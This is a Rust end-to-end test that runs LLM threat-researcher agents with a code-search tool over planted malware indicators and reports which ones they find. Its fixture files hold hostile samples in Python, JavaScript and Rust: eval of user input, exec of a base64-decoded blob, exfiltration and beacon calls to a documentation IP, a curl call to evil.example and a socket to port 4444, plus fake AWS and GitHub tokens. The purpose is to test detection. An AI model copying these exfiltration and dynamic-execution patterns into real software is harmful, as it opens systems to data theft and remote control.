//! End-to-end: the real Threat Researcher role (used verbatim, steered only by
//! its `{instruction}` variable toward abstract themes) is run for a fixed time
//! budget over a directory seeded with planted malicious indicators across
//! secrets, networking, and dynamic-execution categories and several languages.
//!
//! It prints every `codegrep_tool` call the agents made and a found / missed
//! coverage breakdown, then asserts (tolerantly) that the pool surfaced at least
//! one planted indicator. The printed calls are the point: they show how the live
//! model uses codegrep, which is what the prompt and tool docs are tuned against.

use std::fs;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use super::common;

use agentwerk::event::{default_logger, Event, EventKind};
use agentwerk::tools::{CodegrepTool, HandoverTicketTool};
use agentwerk::{Agent, Ticket, TicketSystem};

const THREAT_RESEARCHER_AGENT: &str =
    include_str!("../../../use-cases/src/malware_scanner/agents/threat-researcher.md");

const THREAT_RESEARCH_LABEL: &str = "threat_research";
const ANALYSIS_LABEL: &str = "security_analysis";
const TIME_BUDGET: Duration = Duration::from_secs(60);

/// A planted indicator: a distinctive substring that appears in `codegrep_tool`
/// matched output when the shape is found, plus a category for the breakdown.
struct Indicator {
    marker: &'static str,
    category: &'static str,
}

const INDICATORS: &[Indicator] = &[
    Indicator {
        marker: "eval(",
        category: "dynamic-exec",
    },
    Indicator {
        marker: "b64decode",
        category: "dynamic-exec",
    },
    Indicator {
        marker: "AKIAIOSFODNN7EXAMPLE",
        category: "secret",
    },
    Indicator {
        marker: "ghp_",
        category: "secret",
    },
    Indicator {
        marker: "requests.get",
        category: "networking",
    },
    Indicator {
        marker: "fetch(",
        category: "networking",
    },
    Indicator {
        marker: "TcpStream::connect",
        category: "networking",
    },
    Indicator {
        marker: "Command::new",
        category: "process-spawn",
    },
];

fn plant_fixture(root: &std::path::Path) {
    fs::write(
        root.join("app.py"),
        "import base64, requests\n\
         def handle(user_data, blob, url):\n\
         \x20\x20\x20\x20eval(user_data)\n\
         \x20\x20\x20\x20exec(base64.b64decode(blob))\n\
         \x20\x20\x20\x20requests.get(\"http://198.51.100.7/exfil\")\n\
         AWS_KEY = \"AKIAIOSFODNN7EXAMPLE\"\n",
    )
    .unwrap();
    fs::write(
        root.join("index.js"),
        "function run(input) {\n\
         \x20\x20eval(input);\n\
         \x20\x20fetch(\"http://198.51.100.7/beacon\");\n\
         }\n\
         const token = \"ghp_0123456789abcdefghijklmnopqrstuvwx12\";\n",
    )
    .unwrap();
    fs::write(
        root.join("lib.rs"),
        "use std::process::Command;\n\
         use std::net::TcpStream;\n\
         fn spawn() {\n\
         \x20\x20\x20\x20Command::new(\"curl\").arg(\"http://evil.example\").status().unwrap();\n\
         \x20\x20\x20\x20let _ = TcpStream::connect(\"198.51.100.7:4444\");\n\
         }\n\
         const KEY: &str = \"AKIAIOSFODNN7EXAMPLE\";\n",
    )
    .unwrap();
}

#[tokio::test]
async fn threat_researcher_pool_finds_planted_indicators(
) -> std::result::Result<(), Box<dyn std::error::Error>> {
    let (provider, model) = common::build_provider();

    let dir = crate::test_util::TempDir::new()?;
    let root = dir.path();
    plant_fixture(root);

    // Capture each codegrep_tool call (agent + input) and each output.
    let calls: Arc<Mutex<Vec<(String, serde_json::Value)>>> = Arc::new(Mutex::new(Vec::new()));
    let outputs: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    let calls_c = Arc::clone(&calls);
    let outputs_c = Arc::clone(&outputs);
    let logger = default_logger();
    let event_handler = Arc::new(move |e: Event| {
        match &e.kind {
            EventKind::ToolCallStarted {
                tool_name, input, ..
            } if tool_name == "codegrep_tool" => {
                calls_c
                    .lock()
                    .unwrap()
                    .push((e.agent_name.clone(), input.clone()));
            }
            EventKind::ToolCallFinished {
                tool_name, output, ..
            } if tool_name == "codegrep_tool" => {
                outputs_c.lock().unwrap().push(output.clone());
            }
            _ => {}
        }
        logger(e);
    });

    let tickets = TicketSystem::new();
    tickets.max_time(TIME_BUDGET);
    tickets.max_turns(80);
    tickets.on_event(move |e| event_handler(e));

    // Steer the original role with an ABSTRACT direction only: name the behaviors,
    // never the patterns. The model derives the codegrep shapes itself, and the
    // prompt is used verbatim.
    let instruction = "## Additional Instructions\n\nCover these behaviors in the assigned \
                       technology: dynamic code execution, hardcoded credential tokens or secrets, \
                       network or exfiltration calls including raw sockets, and spawning external \
                       processes or shell commands."
        .to_string();

    for i in 0..2 {
        tickets.agent(
            Agent::new()
                .name(format!("Threat Researcher {}", i + 1))
                .provider(Arc::clone(&provider))
                .model(&model)
                .role(THREAT_RESEARCHER_AGENT.trim())
                .template_variable("instruction", &instruction)
                .label(THREAT_RESEARCH_LABEL)
                .dir(root.to_path_buf())
                .tool(CodegrepTool)
                .tool(HandoverTicketTool)
                .build(),
        );
    }

    // Trivial consumer so handed-off `security_analysis` tickets resolve.
    tickets.agent(
        Agent::new()
            .name("Triage")
            .provider(Arc::clone(&provider))
            .model(&model)
            .role(
                "You receive one security finding. Immediately call `finish_ticket` with a \
                 one-word summary such as \"noted\". Do not call any other tool.",
            )
            .label(ANALYSIS_LABEL)
            .dir(root.to_path_buf())
            .build(),
    );

    for ext in ["py", "js", "rs"] {
        tickets.ticket(
            Ticket::new(format!(
                "Hunt for novel malicious code shapes across the whole scan directory. The \
                 project contains `.{ext}` files; identify that technology and search every \
                 file, since payloads hide under any extension."
            ))
            .label(THREAT_RESEARCH_LABEL),
        );
    }

    let results = tickets.finish().await;
    common::print_result(results, tickets.stats());

    let calls = calls.lock().unwrap().clone();
    let outputs = outputs.lock().unwrap().clone();
    let all_text = outputs.join("\n");

    // Every codegrep call the agents made: the raw material for tuning the prompt.
    eprintln!("\n--- codegrep calls ({}) ---", calls.len());
    for (agent, input) in &calls {
        eprintln!(
            "[{agent}] codegrep_tool({})",
            serde_json::to_string(input).unwrap()
        );
    }

    // Query-quality breakdown: the two shapes that dominate a bad run. A placeholder
    // leak (`<call>(...)`) or an unanchored pattern (only metavariables and
    // punctuation) matches nothing or everything. The test asserts nothing on these;
    // the counts make a prompt regression visible without making the run flaky.
    let patterns: Vec<&str> = calls
        .iter()
        .filter_map(|(_, input)| input["pattern"].as_str())
        .collect();
    let placeholder = patterns.iter().filter(|p| has_angle_placeholder(p)).count();
    let no_anchor = patterns
        .iter()
        .filter(|p| !has_angle_placeholder(p) && !has_literal_anchor(p))
        .count();
    eprintln!(
        "\n--- codegrep query quality ({} patterns) ---",
        patterns.len()
    );
    eprintln!("placeholder (<word> leak): {placeholder}");
    eprintln!("no literal anchor:         {no_anchor}");
    eprintln!(
        "well-formed:               {}",
        patterns.len() - placeholder - no_anchor
    );

    // Coverage breakdown: report every planted indicator, found or missed.
    eprintln!("\n--- planted indicator coverage ---");
    let mut found = 0usize;
    for indicator in INDICATORS {
        let hit = all_text.contains(indicator.marker);
        eprintln!(
            "{} [{}] {}",
            if hit { "FOUND " } else { "MISSED" },
            indicator.category,
            indicator.marker
        );
        if hit {
            found += 1;
        }
    }

    assert!(
        !calls.is_empty(),
        "the Threat Researcher made no codegrep_tool calls"
    );
    assert!(
        found > 0,
        "agents surfaced none of the planted indicators; codegrep output: {all_text}"
    );

    Ok(())
}

/// True when the pattern carries a lowercase-led `<word>` placeholder the writer
/// meant to fill with a real identifier; codegrep matches the literal `<`, the
/// word, `>`, so the query finds nothing.
fn has_angle_placeholder(pattern: &str) -> bool {
    let chars: Vec<char> = pattern.chars().collect();
    for (i, &c) in chars.iter().enumerate() {
        if c != '<' {
            continue;
        }
        let start = i + 1;
        if !chars
            .get(start)
            .is_some_and(|first| first.is_ascii_lowercase())
        {
            continue;
        }
        let mut end = start;
        while chars
            .get(end)
            .is_some_and(|w| w.is_ascii_lowercase() || w.is_ascii_digit() || *w == '_')
        {
            end += 1;
        }
        if chars.get(end) == Some(&'>') {
            return true;
        }
    }
    false
}

/// True when the pattern contains at least one literal identifier to anchor on,
/// skipping metavariables (`$NAME`, `$...NAME`). A pattern of only metavariables
/// and punctuation has no anchor and matches every construct.
fn has_literal_anchor(pattern: &str) -> bool {
    let chars: Vec<char> = pattern.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '$' {
            i += 1;
            while chars.get(i) == Some(&'.') {
                i += 1;
            }
            while chars
                .get(i)
                .is_some_and(|w| w.is_ascii_alphanumeric() || *w == '_')
            {
                i += 1;
            }
            continue;
        }
        if chars[i].is_ascii_alphabetic() {
            return true;
        }
        i += 1;
    }
    false
}
